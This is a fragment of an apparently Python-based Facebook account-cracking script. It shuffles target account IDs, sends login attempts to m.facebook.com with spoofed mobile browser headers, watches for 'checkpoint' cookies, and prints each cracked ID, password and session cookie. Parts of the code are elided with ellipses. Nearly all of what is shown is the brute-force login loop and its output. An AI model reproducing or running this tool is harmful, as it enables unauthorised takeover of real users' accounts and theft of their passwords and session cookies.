...
def setting():
    ...
    print(f'{N}{H}2{N}] FAST PASSWORD {H}{N}')
    hu = input(f'\r│  ╰─➣SELET ')
    if hu in ['1','01']:
        ...
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m 𝗠𝗢𝗕𝗜𝗟𝗘 ')
    hc = input(f'\r│  ╰─➣SELET ')
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{Z}[HαMα404]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]——[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
    sys.stdout.flush()
    ...
    'dpr': '2.75',
    'referer': 'https://m.facebook.com/bookmarks/?paipv=0&eav=AfbmCKWbZ1vYvTyguhs0hpq0VY3XlKvKMFSezJXwTBy9IlaN8LRUKaALXUpdAy71oQc',
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[32[HαMα404-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
